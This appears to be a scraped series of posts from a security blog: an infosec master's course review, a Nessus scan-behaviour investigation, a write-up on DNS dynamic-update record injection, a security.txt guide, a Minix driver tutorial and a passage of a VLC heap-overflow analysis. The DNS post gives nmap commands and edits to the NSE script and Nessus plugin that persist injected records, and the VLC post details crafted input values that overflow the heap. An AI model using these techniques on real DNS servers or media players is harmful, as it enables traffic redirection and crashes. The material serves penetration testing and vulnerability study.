known coming into the course. Either way, I found the system programming segments of the course to be frustrating and stressful as they were a very large part of my final grade. Ultimately I did prevail and though I have some pretty big issues with this particular aspect of the course, I do think overall I would continue to recommend it to those who want to learn more about operating systems. My recommendation to Johns Hopkins however is to use a more relevant, modern operating system (like actual Linux!) as the practical foundation for this class. Web Security: This course was an interesting overview of the wide-variety of web-related technologies a security professional must consider, with topics including web-based crypto, writing RESTful APIs using Flask, AWS cloud, SAST/DASTWAF concepts, IoT protocols, container technologies such as Docker, open-source vulnerability scanners and finally a module on traditional web-application vulnerabilities such as XSS, SQLi etc‚Ä¶ I found this course to be a little meandering, never doing anything more than scraping the surface of each of these topics. Yes, there were some interesting practical exercises sprinkled throughout but mostly I found that getting a ‚Äútaste‚Äù of so many things was not that valuable (to me personally). I‚Äôll qualify this by saying at this point in time I had several years of web application security and cloud experience so some of this material may have simply just not been that new to me and thus I found the lectures and assignments a bit boring. For someone interested in getting a look on everything ‚Äúgoin on‚Äù in the web security world, I think this course can satisfy that specific need. Outside of that, I think most people might leave this class just hungry for something a little more substantial. Intrusion Detection: My seventh and final elective was Intrusion Detection. I had not intended to take this course and only did end up enrolling due to availability and scheduling issues related to another class I had planned on taking. It was my final semester however and at this point I really wanted to close the book on this program and move on to other things in my life! It turns out that I‚Äôm happy I took the course as it was (similar to my Reverse Engineering course) a really satisfying mix of both theory and practical exercises. Notably, I‚Äôd like to call out the excellent labs (assigned weekly) which covered a wide variety of tools (some of which I did have prior experience with) such as Nmap, Linux, TripWire, OSSEC, Snort, Neo4j, Cypher, Zeek, iptables, ROC analysis, Keras and RapidMiner. I definitely recommend this class for anyone looking to get some good experience with any one of these tools and learn more about general intrusion detection in the process. What I wish I had done differently: Having finally graduated, I wanted to take a look back at my experience both with JHU at a high level and with each of my classes and reflect on what I may have done differently. First I want to say that if I could go back in time, I would stilll choose the JHU program over any of the other schools I had considered. What I would change however is some of the classes I took. I‚Äôve made it clear in my reviews above what classes I thought were good, which had value specifically to me and which classes I thought were awful. Out of the 10 masters-level classes I took, three of them I found both well done and applicable/valuable to my career, three of them I found very interesting and well done yet not particularly relevant to my career, two of them I found a little too ‚Äúhigh level‚Äù and not particularly useful and another two I thought were just atrocious. Looking at these numbers it‚Äôd be easy to come to the determination (with only 3 classes I actually thought were useful to me) that I didn‚Äôt get out of this program what I had hoped. Had I chose different classes I certainly would have gotten more out of the program but I am thankful for what I was able to learn. Some classes I would have liked to try instead include offerings on Java Security, Cyber Physical Systems Security, Operating Systems Security and even Digital Forensics. I‚Äôll add that there seems to have been some significant changes to the course catalog since I graduated (which was only a few weeks ago as of this writing) with more courses having been added, notably classes on DevOps and ‚ÄúAssured Autonomy‚Äù, both of which might have been interesting to me and would certainly be worth checking out for anyone considering this program. After taking the class in reverse engineering and vulnerability analysis, the professor suggested, for anyone who was interested, doing an Independent Study in place of a typical elective. This would offer the same three credits but allow for a more exploratory, research-oriented approach to the reverse engineering material (or any other class you would be interested in). I seriously considered doing this for reverse engineering but ultimately decided not to. I regret this decision and recommend those who are taking this program to not be lazy and do what you think sounds interesting, even if it will be more work. RetrospectiveIt‚Äôs really incredible and I‚Äôm extremely grateful for all the opportunities I‚Äôve been given over the last 5 years and though there are plenty of things I would change if I could go back and somehow make adjustments along the way, I am ultimately very satisfied with how everything has turned out and the choices I made. In closing, I have just a few parting nuggets of ‚Äúwisdom‚Äù / advice I‚Äôd like to share. Make an effort to continually re-focus, frequently ask yourself what you want to do or where you‚Äôd like to be and make constant adjustments to better reach that goal. It‚Äôs easy to be swept into something or fall into a ‚Äúcomfort zone‚Äù such that you drift away from where you really want to be. Appreciate all opportunities and try not to discount the things you may learn that you think are not relevant or useful. Too many times have I had the chance to learn something I didn‚Äôt think was useful so I never really committed myself to it, only to later realize i DID want to know it and was then force to teach myself again. You‚Äôll save yourself plenty of time and headache by just having an open mind and being as much of a willing knowledge-sponge as possible. Revel in the fact that infosec is such a cool and exciting field! One that for those who are motivated enough, can be a place of rapid development and overwhelming opportunity. Take advantage of the vast network of people just like yourself who are looking to share their experiences, network and continuously learn. Thanks so much for reading, whether it was the entirety of this article (I know it‚Äôs quite long) or any given section. I hope some of it was enlightening or valuable and if there are any questions or you‚Äôd like to know more / share your own experiences I‚Äôd love to hear about it! Feel free to reach out anytime!

Recently, I decided to take a closer look at the discovery scans configured within my organizations Tenable. sc instance with the goal of improving the speed and efficiency by which the scans would run. Here‚Äôs what everything looked like after some tweaking‚Ä¶ UPDATE [9/25/2020]: An engineer from Tenable happened across this post and reached out to clarify some of the seemingly peculiar behavior described in the original post. First, on the topic of why Nessus scans ports you haven‚Äôt explicitly targeted - Essentially, according to Tenable, it really can‚Äôt be avoided. I pretty much knew this as I had previously found the built-in config file specifying ping methods and port targets. What I found more illuminating was that Nessus has a Ping hierarchy where basically, it will try certain ping methods first and if they are successful, will NOT attempt subsequent ping methods. This answers why in cases where i specified certain ports be ‚Äúpinged‚Äù, they were not actually targeted. This is because I had successful pings that preceded it, thus rendering pinging the arbitrary points unnecessary. Basically the point of the ‚ÄúPing‚Äù portion of a Nessus scan is to find ONE piece of evidence a host is live rather than see all the ways a host is live. So Nessus may not in-fact be ‚Äúlying‚Äù to us after all, but that doesnt make it any less confusing =). . . . End of UpdateI got the scan policy whittled down to just two plugins, the FQDN plugin (12053) and the standard ‚ÄúNessus Scan Information‚Äù plugin (19506). I then disabled all port scanning and service discovery switches. Finally I disabled ARP and UDP ping methods in the ‚ÄúHost Discovery‚Äù tab of the scan policy, leaving only ICMP and TCP ping switches on (with TCP ping Destination ports of 22,80,135,139,443,445 and 1337) as shown below‚Ä¶ *The TCP ping port 1337 has been included here for demonstration purposes. I then logged into the cli for the Nessus scanner which would be sending the scan traffic, started a network capture and observed what traffic this very lightweight policy would send. My expectation of course, was that it would send exactly what I told it to - an ICMP ping as well as TCP pings to the specified ports. Instead, I got the following‚Ä¶ Network Capture w/ TCP Pings ENABLED Ok, so a couple observations‚Ä¶ First, and most obviously, a lot more traffic was sent than I expected, including to ports I did not explicitly set. This seemed a bit strange, but after some research I found that Nessus has a built-in set of ports it uses for its TCP Ping Methods. Typically, this port-set is requested by inputting ‚Äòdefault‚Äô in the TCP destination ports for the ‚ÄúPing Methods‚Äù section of the ‚ÄúHost Discovery‚Äù tab in the Nessus scan policy (‚Ä¶inhales‚Ä¶). However, I did not specify ‚Äòdefault‚Äô, rather I put my own custom range in. Clearly Nessus is ignoring me here. Now the second, and more frustrating observation is that I don‚Äôt actually see the syn packet to my ‚Äò1337‚Äô port either! Alright, so let‚Äôs move on from the TCP Ping switch. Let‚Äôs observe the behavior when this switch is disabled completely‚Ä¶ Network Capture w/ TCP Pings DISABLED ‚Ä¶‚Ä¶ ‚Ä¶ ‚Ä¶Interesting‚Ä¶‚Ä¶ So even with TCP ping off, Nessus goes right ahead and tries to initiate some handshakes with a bunch of ports that look suspiciously like the ‚Äòdefault‚Äô ports from before (also known as ping_host4. inc file located on the Nessus box). At this point I gave up trying to convince the Nessus policy to obey me. But I was still curious, what would happen if I disabled everything, and I mean EVERYTHING in the policy. I toggled every switch, even disabling ICMP pings. I turned off all plugins. I shut it all down. I then ran the scan‚Ä¶ No change in behavior. Suffice it to say, Nessus is lying to us. " }, { "id": 99, "url": "https://shellsharks.com/dynamic-dns-injection", "title": "DNS Record Injection using Nmap and Nessus", "body": "2019/12/16 - On a penetration test or as a result of a vulnerability scan you may encounter a ‚ÄúDNS Server Dynamic Update Record Injection‚Äù finding. Nessus for example, is one such vulnerability scanner that can identify this issue. This vulnerability allows anyone with access to the afflicted DNS server (over UDP port 53) the ability to add or even remove DNS records to/from a zone. The danger of this vulnerability, put simply by the Nessus plugin itself is‚Ä¶ ‚ÄúThis protocol ‚Ä¶ could be subverted by malicious users to redirect network traffic. ‚Äù OK, so Nessus has identified the vulnerability - great! As a penetration tester, you may be interested in exploring that vulnerability further. Let‚Äôs start digging into this by taking a closer look at the Nessus plugin itself. When found, the Nessus plugin will output‚Ä¶ ‚ÄúNessus was able to register a new A record into the following zone: [ZONE]‚Äù. This is an interesting message as it expresses that Nessus was actually able to ADD a record. What is unclear is whether that record was subsequently deleted or what the record details were (e. g. hostname, IP, etc‚Ä¶) Without more control over how the Nessus plugin is executed we may not be able to take advantage of it for our malicious purposes. Instead, let‚Äôs take a look at Nmap and see if it has anything we can use‚Ä¶ Nmap ArsenalIt turns out Nmap has functionality very similar to the DNS Server Dynamic Update Record Injection plugin from Nessus. With a standard install, Nmap contains a suite of NSE scripts (in /usr/share/nmap/scripts on Kali), one of which is named dns-update. nse. When the dns-update. nse script is run against the vulnerable DNS server the output specifies that a record is successfully added and then subsequently deleted. (Syntax for running the NSE script and the output is shown below). nmap -sU -p 53 --script=dns-update --script-args=dns-update. hostname=[new hostname],dns-update. ip=[new ip] [DNS server ip]PORT STATE SERVICE53/udp open domain| dns-update:| Successfully added the record nmap-test. cqure. net |_ Successfully deleted the record nmap-test. cqure. net Similar to the Nessus plugin, this NSE script can add a record to the zone but unlike the Nessus plugin, this script also lets us know what the hostname value of the record was and lets us know that the record was ALSO deleted. With this information in hand, let‚Äôs peek into the NSE script code and see if we can‚Äôt get a better idea of what it is doing and how we might modify it to add a record of our choosing. After a closer inspection, I found that by commenting out a few lines of code in the NSE script I could remove the logic which deletes the A record after it had been added. The code to comment out is shown below‚Ä¶ . . . local status, err = dns. update( name, { host=host, port=port, dtype= A , data=ip } )if ( status ) then local result = {} table. insert(result, ( Successfully added the record \ %s\ ):format(name)) --local status = dns. update( name, { host=host, port=port, dtype= A , data= , ttl=0 } ) --if ( status ) then -- table. insert(result, ( Successfully deleted the record \ %s\ ):format(name)) --else table. insert(result, ( Failed to delete the record \ %s\ ):format(name)). . . So now, by re-running the script ‚Äúnmap -sU -p 53 ‚Äìscript=dns-update ‚Äìscript-args=dns-update. hostname=[new hostname],dns-update. ip=[new ip] [DNS server ip]‚Äù you will be able to add a hostname without having that hostname deleted afterwards. This can be further verified using the nslookup command‚Ä¶ Setting DNS server to use in interactive Nslookup prompt‚Ä¶ # nslookup&gt; server [DNS server ip - for example 10. 10. 10. 10]Default server: 10. 10. 10. 10Address: 10. 10. 10. 10#53Before running the NSE script exploit, the record you wish to inject will not be present. &gt; [hostname]. [zone]Server: 10. 10. 10. 10Address: 10. 10. 10. 10#53*** server can't find test. zone: SERVFAILAfter running the NSE script exploit you will see your injected record successfully resolves. &gt; [hostname]. [zone]Server: 10. 10. 10. 10Address: 10. 10. 10. 10#53Name: test. zoneAddress: 127. 1. 2. 3From here, you can being subsequent exploitation by having traffic routed to a domain of your choosing! Weaponizing NessusWith just a little bit of know-how, it is also possible to modify the Nessus plugin in a similar way to how we modified the Nmap NSE script to achieve the DNS record injection. First, on a box with Nessus installed, list all plugins (stored in /opt/nessus/lib/nessus/plugins) and then search for the plugin ID (which is 35372). ls /opt/nessus/lib/nessus/plugins | grep -iR script_id(35372) dns_dyn_update. nasl: script_id(35372)Here you‚Äôll see one result - ‚Äúdns_dyn_update. nasl‚Äù. The Nessus Attack Scripting Language or NASL files are Nessus‚Äô way of running its respective plugins. Taking a closer look at this file, I identified just a few code modifications needed to allow me to add a DNS record of my choosing without it being deleted afterwards. These code modifications are shown below‚Ä¶ To add a hostname record, modify the following portions of code. (I recommend making a copy of the NASL file before modifying. ) . . . pkt += raw_string( 0, 4, # Data length [ip separated by commas - 127, 1, 2, 3]); #Square brackets are not part of the codereturn pkt;. . . dynname = [hostname] ;. . . #pkt = dns_update_A(zone: zone, dynname, delete: 1); #COMMENT THIS LINE OUT#send(socket:soc, data: pkt); #COMMENT THIS LINE OUT. . . Once the code has been modified, the script can be run directly using the nasl utility included with the Nessus install. /opt/nessus/bin/nasl -t [target DNS server] /opt/nessus/lib/nessus/plugins/dns_dyn_update. nasl -M==========[ Executing dns_server. nasl ]======dns_server. nasl: Successdns_server. nasl: Success----------[ Finished dns_server. nasl 16msec ]------==========[Executing bind_hostname. nasl ]======----------[ Finished bind_hostname. nasl 13msec ]------==========[Executing /opt/nessus/lib/nessus/plugins/dns_dyn_update. nasl]======Nessus was able to register a new A record into the following zone :[hostname. zone]----------[ Finished /opt/nessus/lib/nessus/plugins/dns_dyn_update. nasl 17msec ]------To then delete a hostname record simply uncomment the previously commented lines and re-run the NASL script‚Ä¶ #pkt = dns_update_A(zone: zone, dynname, delete: 1);#send(socket:soc, data: pkt);Closing Thoughts As you can see, Nmap and Nessus definitely have some offensive capability which extends past your typical recon/enumeration/vulnerability scanning typically thought of when considering these two tools. With over 100k plugins/NASL files provided in Nessus (of course not all of which are ‚Äúexploitable‚Äù) and another 590 NSE scripts which come with Nmap, there is a lot of potential for leveraging pre-built exploits for your own work. Despite Tenable claiming (via it‚Äôs Security Center product) that there is no exploit available for this vulnerability, you now know that there definitely is. What‚Äôs funny here is Nessus states that it was able to exploit the vulnerability and then proceeds to claim that there is no exploit. Update your DNS servers if you find this vulnerability! Tenable classifies this as a Medium risk issue though I personally think this is High risk. Thanks for reading!

This proposal, dubbed ‚ÄúA Method for Web Security Policies‚Äù, specifies a standardized file (similar to that of robots. txt or humans. txt) named security. txt. This file will give security researchers (or anyone with a security concern to report) an easy way to learn about a site‚Äôs disclosure process or contact those responsible for site security. Primary information included in this file includes contact information, public keys for encrypted communication, acknowledgements for previous researchers and more. For more information on the draft RFC or to create a security. txt file of your own, please reference the project website. Update: 5 years after work began for security. txt, RFC 9116 has now officially been published! More on security. txt: I think this is a great addition to the Internet at large and should prove very beneficial to security researchers. Having created one of my own, I have some additional thoughts/tips if you decide to create one for yourself. I like the idea of having a directive that quickly summarizes what level of ‚Äúconsent‚Äù your site has with respect to vulnerability testing. For example, if you don‚Äôt authorize testing of any kind, you could specify this. Or, if your site has an open or by-invite-only bug-bounty program, you could specify that instead. For example, the directive/value pair Testing-Consent: None could be used to express this information. Note: This directive is not one of the current standard directives contained in the draft RFC (but perhaps I will submit my own comment). For the Encryption directive, I use gpg (GnuPG) to create a public/private key pair and serve the public key directly from my site. To combat potential tampering of security. txt, it is recommended to digitally sign the file. Security researchers should verify this signature prior to using any information contained within (see Section 6. 1 of Draft RFC). With this in mind, I recommend to not serve both the public key and the security. txt signature from your site since in the event of a compromise, it would be trivial for an attacker to modify both of these files such that the signature would appear to be valid. I‚Äôve also included an additional non-standard directive in my own security. txt file which specifies the date the security. txt file was last updated. Last-Updated would include just a simple date value (e. g. 12/13/2019). Tips for Using gnupg: A few tips for creating your own signature files and validating the one I have provided in my security. txt file. 1 Generate an OpenPGP Key gpg --gen-keyExport public key gpg --export -a --ouput [file] user@email. comCreate a digital signature gpg -u user@email. com --output security. txt. sig --armor --detach-sig security. txtVerify a digitally signed file. gpg --verify security. txt. sig security. txt" }, { "id": 101, "url": "https://shellsharks.com/online-training", "title": "Online IT/Security Training", "body": "2019/12/13 - Getting into information security as a newcomer or keeping your skills up-to-date as an existing security practitioner can be difficult.

That post is an introduction to programming device drivers on Minix in C. Device drivers are, in short, software programs that control hardware devices. Minix, as described by the Minix homepage, is a free, open-source, operating system designed to be highly reliable, flexible and secure. Minix is certainly not the only example of a micro-kernel design for an operating system but it does serve as an introduction to the world of micro-kernels. Disclaimer: This exploratory topic is related to some graduate work I did while pursuing my Masters degree. I am by no means an expert in C programming nor Minix. With that said, there's not a lot of information out there on Minix so I hope this work can be valuable to others. Minix Wiki TutorialStep 1 of course is to begin following the instructions detailed in the Programming Device Drivers in Minix tutorial. In that tutorial, you will create the driver directory, Makefile and driver file as well as setup the driver configuration file, start the driver service and create the character device. Rather than rehash all these steps (which are covered in great detail in that post), I will cover a few minor differences in my setup as well as a few slightly more advanced points. Navigate to the Minix drivers directory /usr/src/minix/drivers/. Here, you can make a copy of the hello driver which was discussed in the Wiki post /usr/src/minix/drivers/examples/hello. In this folder you should see the Makefile, hello. c, header file and more (all of which was covered in the Minix wiki post). You do not need the . o, . h or . d files. You can rm them for now. From here, you can rename your hello. c file to whatever you want your device to be called (from here I will refer to this as [name]). Similarly, you will have to edit the contents of the Makefile, contents of the hello. c (now renamed to what you want) and the directory name of your driver replacing any instance of the word ‚Äúhello‚Äù with your chosen name word [name]. After you‚Äôve made these name-related changes, you can test the build by running‚Ä¶ make cleanmakemake installUnlike in the tutorial, rather than create a hello. conf in the driver‚Äôs directory itself, we instead put the configuration information in the more global /etc/system. conf directory/file. The configuration information for your driver can be the same as what was in the example ‚Äòhello‚Äô driver configuration. (In other words, you can copy exactly what is in this configuration file for the hello driver and put it at the end of the . conf file - but remember to change the name!). Now, we can create the device file with the command‚Ä¶ mknod /dev/[name] c [major number] [minor number]The major number and minor numbers are used by the system to associate the driver with the device. More information on these numbers can be read about here. Whats important is you choose a device number that is not already being used by an existing driver. You can see what device numbers are in used by running the command‚Ä¶ ls -l /dev | cut -d -f 11 | cut -d , -f 1 | uniq | sortThe service can now be booted up by running‚Ä¶ service up /service/[name] -major [chosen major number]The service can also be taken down with the command‚Ä¶ service down [name]From here you should be able to read from the device driver. For example, issuing a cat /dev/[name] should let you read from the device. This is about where the Minix wiki tutorial finishes up. Going a Bit Further‚Ä¶The simple character device driver from the Minix tutorial includes function prototypes for opening, closing and reading from the device file. But what if you would like some additional functionality - say, writing to or controlling I/O to the file? In the driver source there is an include file referencing &lt;minix/chardriver. h&gt; (this is a reference to /usr/include/minix/chardriver. h). This file contains the entry points for additional device dependent character driver function prototypes. This file includes not only open, close and read but also write, ioctl, cancel, select, intr, alarm and other. For now, we will cover adding both write and I/O control (ioctl) functionality to the driver. Included below are the function prototypes covered by this tutorial (from /usr/include/minix/chardriver. h). struct chardriver { int (*cdr_open)(devminor_t minor, int access, endpoint_t user_endpt); int (*cdr_close)(devminor_t minor); ssize_t (*cdr_read)(devminor_t minor, u64_t position, endpoint_t endpt, cp_grant_id_t grant, size_t size, int flags, cdev_id_t id); ssize_t (*cdr_write)(devminor_t minor, u64_t position, endpoint_t endpt, cp_grant_id_t grant, size_t size, int flags, cdev_id_t id); int (*cdr_ioctl)(devminor_t minor, unsigned long request, endpoint_t endpt, cp_grant_id_t grant, int flags, endpoint_t user_endpt, cdev_id_t id);In your device driver code you will see these function prototypes initialized. You will notice of course that the write and ioctl functions are not included in the hello example driver. You must add these function declarations. This can be done by copying the declarations seen in the chardriver. h file described above into the driver source file. Note _*__ the name of the function should not be (*cdr_open) but rather a function name of your choice, such as _[name]_write. Following the function prototype declarations, you will see some entry points into the driver, defined in struct chardriver. You will need to add some entry points for the other functions not defined in the original example hello driver. This includes the write and ioctl functions. Adding these to the chardriver struct can be seen below. static struct chardriver [name]_tab ={ . cdr_open = [name]_open, . cdr_close = [name]_close, . cdr_read = [name]_read, . cdr_write = [name]_write, . cdr_ioctl = [name]_ioctl,};read Function: As discussed in the Minix wiki post, the read function copies a string from the device driver program back to the calling user program by reading from the device file /dev/hello. This is done within the device driver primarily through the use of the sys_safecopyto function. The sys_safecopyto function reads size (which is a value passed to the read function as an argument) amount of bytes from the location pointed to by ptr and passes that back to the libc library read call which invoked it. In the code snippet below, whatever value is stored in int contents is passed back to the caller. int contents;. . . static ssize_t [name]_read(devminor_t UNUSED(minor), u64_t position, endpoint_t endpt, cp_grant_id_t grant, size_t size, int UNUSED(flags), cdev_id_t UNUSED(id)){ int *ptr; int ret; ptr = contents; size = sizeof(ptr); if ((ret = sys_safecopyto(endpt, grant, 0, (vir_bytes) ptr, size)) != OK) { return ret; } return ret;}This read function is invoked from a user program such as the (simple) one included below. This program simply reads an integer out of the device file and displays it on the command line. #include &lt;stdio. h&gt;#inclue &lt;sys/types. h&gt;#include &lt;fcntl. h&gt;#include &lt;stdlib. h&gt;#include &lt;unistd. h&gt;#define [NAME]_DEV /dev/[name] int main (int argc, char *argv[]) { int data; fd = open([NAME]_DEV, O_RDWR); if (fd &gt; 0) perror ( open ), exit(-1); if (read (fd, &amp;data, sizeof(data)) &lt; 0) { perror ( read ) exit (1); } printf( %d\n , data) close (data); exit(0);}write Function: In the [name]_write function shown below, the reverse of sys_safecopyto is used - sys_safecopyfrom. This function is used to take data from the caller and write it into a value in the driver. The sys_safecopyfrom function writes size bytes from the calling libc library write function and writes it into the location pointed to by ptr. The [name]_write function code is shown below. In this case, an integer is being written from the calling function to the device file. static ssize_t [name]_write(devminor_t UNUSED(minor), u64_t position, endpoint_t endpt, cp_grant_id_t grant, size_t size, int UNUSED(flags), cdev_id_t UNUSED(id)){ int ret; int value; int *ptr = &amp;value; if ((ret = sys_safecopyfrom(endpt, grant, 0, (vir_bytes) ptr, size)) != OK) { return ret; } return sizeof(value);An example of a C script which performs the libc library write call which calls the device driver write function and writes an integer to the device file is shown in the snippet below. #include &lt;stdio. h&gt;#inclue &lt;sys/types. h&gt;#include &lt;fcntl. h&gt;#include &lt;stdlib. h&gt;#include &lt;unistd. h&gt;#define [NAME]_DEV /dev/[name] int main (int argc, char *argv[]) { int data; fd = open([NAME]_DEV, O_RDWR); if (fd &lt; 0) perror( open ), exit(-1); if (argc &gt; 1) { data = atoi(argv[1]); } if (write (fd, &amp;data, sizeof(data)) &lt; 0) { perror ( write ); } close(fd); exit(0);}ioctl function: Finally there is the ioctl function. ioctl is used to manipulate underlying device parameters of special files (i. e. device files). To set up I/O control for this simple driver, we can create a header file (call it something like ioc_[name]. h and place it in the /usr/include/sys/ directory). This file can later be referenced in your device driver file using #include &lt;sys/ioc[name]. h&gt;_. In this file, you will define the different I/O control methods. For example, you could define three I/O control methods which control reading, writing and clearing a device file. This code is shown below‚Ä¶ #ifndef _S_I_[NAME]_H#define _S_I_[NAME]_H#include &lt;minix/ioctl. h&gt;#define IOCREAD _IOR('h', 3, u32_t)#define IOCWRITE _IOW('h', 4, u32_t)#define IOCCLEAR _IOW('h', 5, u32_t)#endifThe file above has a single include, (&lt;minix/ioctl. h) which contains only a single line which is another include, (&lt;sys/ioccom. h&gt;). ioccom. h contains the references for different types of I/O control definitions. The two definitions we will use (in our simple driver addition) are shown in the snippet below. It‚Äôs important to note that there are far more definitions which could be used in more advanced drivers. #define _IOR(g,n,t) _IOC(IOC_OUT, (g), (n), sizeof(t))#define _IOW(g,n,t) _IOC(IOC_IN, (g), (n), sizeof(t))Now that we have the I/O header for our device driver, we can initialize the [name]_ioctl function in our driver file. The code snippet below is an example of how that would be done. The important function argument in the ioctl function is the unsigned long request parameter. This request value is the control value sent from the user program to the device driver which specifies which I/O control method is being invoked. static int [name]_ioctl(dev_minor_t minor, unsigned long request, endpoint_t endpt, cp_grant_id_t grant, int flags, endpoint_t user_endpt, cdev_id_t id){ if(request==IOCREAD) { //Insert Functionality Here } if(request==IOCWRITE) { //Insert Functionality Here } if (request==IOCCLEAR) { //Insert Functionality Here } return -1}An example user program is provided in the snippet below‚Ä¶ In this example, a single IOC call is made. It is up to you to figure out what you would like the different functionality to be! #include &lt;sys/types. h&gt;#include &lt;sys/ioc_[name]. h&gt;#include &lt;sys/ioctl. h&gt;#include &lt;fcntl. h&gt;#include &lt;stdlib. h&gt;#include &lt;unistd. h&gt;#define [NAME]_DEV /dev/[name] int main (int argc, char *argv[]) { int data; fd = open([NAME]_dev, O_RDWR); if (fd &lt; 0) perror ( open ), exit(-1); if (ioctl (fd, [IOCREAD], &amp;value) &lt; 0) perror ( ioctl ); close(fd); exit(0);}This was just a quick look at adding a bit more functionality to a device driver in Minix.

" }, { "id": 103, "url": "https://shellsharks.com/vlc-heap-overflow", "title": "Heap Buffer Overflow in VLC v0.9.4", "body": "2019/10/08 - A previous post analyzed a stack buffer-overflow in the parse_master function of VLC &lt;=v0. 9. 4. parse_master is susceptible to another vulnerability, this time of the heap-overflow variety. * Following this analysis requires some understanding of Intel assembly and basic reverse engineering concepts. Throughout the analysis below, portions of the ty. c source code are referenced using a bracketed [1] annotation. This source code and all annotations are provided at the bottom of the page. In most cases, code snippets are also provided directly below the paragraph where the code is referenced. Explanation of Source Code: When VLC plays a . ty or any other file and encounters a certain sequence of bytes [13] it calls the parse_master function with p_demux as an argument [15]. p_demux is the remaining (unprocessed) bytes of the input video file. The peek function [14] compares the current 4 bytes in the input stream to the magic bytes [13] and then rewinds p_demux to the offset beginning with those same bytes (in other words, if the magic bytes are encountered, parse_master is passed the input stream (p_demux) starting with the offset of the magic bytes). #define TIVO_PES_FILEID ( 0xf5467abd ) [13]. . . /* check if it's a PART Header */ if( U32_AT( &amp;p_peek[ 0 ] ) == TIVO_PES_FILEID ) [14] { /* parse master chunk */ parse_master(p_demux); [15]As you can see in the image below, the byte stream begins with the magic bytes ‚ÄúF5 46 7a bd‚Äù. The parse_master function begins with declaring a series of variables including an array of 32 8-bit integers (mst_buf) [1] as well as two 32-bit integers (i and i_map_size) [2]. Further down, there is a call to thhe stream_Read function which reads 32 bytes from the input stream into mst_buf [3]. The following line [4], sets i_map_size to the 32-bit value located at mst_buf[20]. The variable i is then initialized [6] to the 32-bit value at the end of the mst_buf buffer (mst_buf[28]). Finally, the i_seq_table_size data element in the p_sys structure is set to the result of the expression i / (8 + i_map_size) [7]. demux_sys_t *p_sys = p_demux-&gt;p_sys;uint8_t mst_buf[32]; [1]int i, i_map_size; [2]. . . stream_Read(p_demux-&gt;s, mst_buf, 32); [3]i_map_size = U32_AT(&amp;mst_buf[20]); /* size of bitmask, in bytes */[4]p_sys-&gt;i_bits_per_seq_entry = i_map_size * 8;i = U32_AT(&amp;mst_buf[28]); /* size of SEQ table, in bytes */ [6]p_sys-&gt;i_seq_table_size = i / (8 + i_map_size); [7]After these initial variables are initialized, a malloc call is made [8] with the size argument passed as i_seq_table_size * sizeof(ty_seq_table_t) (the size of the ty_seq_table_t data element is 16). The resulting memory pointer is stored in seq_table. p_sys-&gt;seq_table = malloc(p_sys-&gt;i_seq_table_size * sizeof(ty_seq_table_t)); [8]Further down in the function, a memcpy call is made which takes i_map_size bytes from the mst_buf buffer and writes to the memory location pointed to by seq_table (the pointer returned from our previous malloc call [12]). memcpy(p_sys-&gt;seq_table[i]. chunk_bitmask, &amp;mst_buf[8], i_map_size); [12]Source Code Vulnerability Analysis: With an understanding of the source code, let‚Äôs analyze the vulnerability‚Ä¶ Given i_map_size is a signed integer [1], if we set it to a negative number, say -1 (or FFFFFFFFh) [4] and set i to a value of 7 [6], we can get an i_seq_table_size equal to 1 [7]. Keep in mind, we can set the values of i_map_size and i arbitrarily [4] [6] since these values are parsed directly out of mst_buf which comes from user-supplied input. Now, when malloc is called [8] the size will be 16 (i_seq_table_size which is 1 multiplied by _sizeof(ty_seq_table_t) which is 16) which will return a pointer to a memory region with at-least 16 bytes of memory. Of note here is this is a relatively SMALL memory region (one that would be easier to overflow). uint8_t mst_buf[32]; [1]. . . i_map_size = U32_AT(&amp;mst_buf[20]); /* size of bitmask, in bytes */ [4]p_sys-&gt;i_bits_per_seq_entry = i_map_size * 8;i = U32_AT(&amp;mst_buf[28]); /* size of SEQ table, in bytes */ [6]p_sys-&gt;i_seq_table_size = i / (8 + i_map_size); [7]/* parse all the entries */p_sys-&gt;seq_table = malloc(p_sys-&gt;i_seq_table_size * sizeof(ty_seq_table_t)); [8]Within the for loop declaration [9], we see it should execute i_seq_table_size amount of times which we know is 1 (so it should only iterate once through). Unlike the stack-overflow condition seen in a previous post, the stream_Read call within the for loop should execute with no issues (no overflow condition) as it is merely writing 7 bytes from the input stream into mst_buf [10]. In order to bypass the if condition [11] (which must be done to get to the memcpy function), i_map_size must be &lt;= 8, which we know it is as we had previously set it to -1 (FFFFFFFFh). Finally, we get to the memcpy call [12] which writes FFFFFFFFh bytes from mst_buf into the memory location pointed to by seq_table. Since memcpy uses the FFFFFFFFh size value as an unsigned value, this is a very large amount of data it attempts to write into memory which overflows the allocated memory buffer which was only 16 when first passed to the malloc function earlier. This will result in an access violation and the program crashes due to overflowing the heap buffer! for (i=0; i&lt;p_sys-&gt;i_seq_table_size; i++) { [9] stream_Read(p_demux-&gt;s, mst_buf, 8 + i_map_size); [10] p_sys-&gt;seq_table[i]. l_timestamp = U64_AT(&amp;mst_buf[0]); if (i_map_size &gt; 8) { [11] msg_Err(p_demux, Unsupported SEQ bitmap size in master chunk ); memset(p_sys-&gt;seq_table[i]. chunk_bitmask, i_map_size, 0); } else { memcpy(p_sys-&gt;seq_table[i]. chunk_bitmask, &amp;mst_buf[8], i_map_size); [12]Assembly Code Vulnerability Analysis: Analysis of the vulnerability continues by inspecting the disassembled code‚Ä¶ Initializing i_map_size variable from the mst_buf buffer: After the first of the two stream_Read calls (0x61401C1F), the FFFFFFFFh value passed in via the user inputted . ty file is loaded (via instructions 0x61401C24-0x61401C62) onto the stack and stored at offset 0x0629FB04 (ESP+A0). 61401C24 0FB6B424 D400000&gt;MOVZX ESI,BYTE PTR SS:[ESP+D4]61401C2C 0FB69C24 D500000&gt;MOVZX EBX,BYTE PTR SS:[ESP+D5]61401C34 0FB68C24 D700000&gt;MOVZX ECX,BYTE PTR SS:[ESP+D7]61401C3C 0FB69424 D600000&gt;MOVZX EDX,BYTE PTR SS:[ESP+D6] ;these 4 grab FFFFFFFF from mst_buf stored on stack61401C44 C1E6 18 SHL ESI,1861401C47 89B424 A0000000 MOV DWORD PTR SS:[ESP+A0],ESI61401C4E C1E3 10 SHL EBX,1061401C51 099C24 A0000000 OR DWORD PTR SS:[ESP+A0],EBX61401C58 C1E2 08 SHL EDX,861401C5B 098C24 A0000000 OR DWORD PTR SS:[ESP+A0],ECX ;these 6 instructions convert endianness of bytes from input buffer61401C62 099424 A0000000 OR DWORD PTR SS:[ESP+A0],EDX ;storing in 060BFB04Initializing i variable from the mst_buf buffer: The i variable has the user inputted value loaded into it from the mst_buf array.

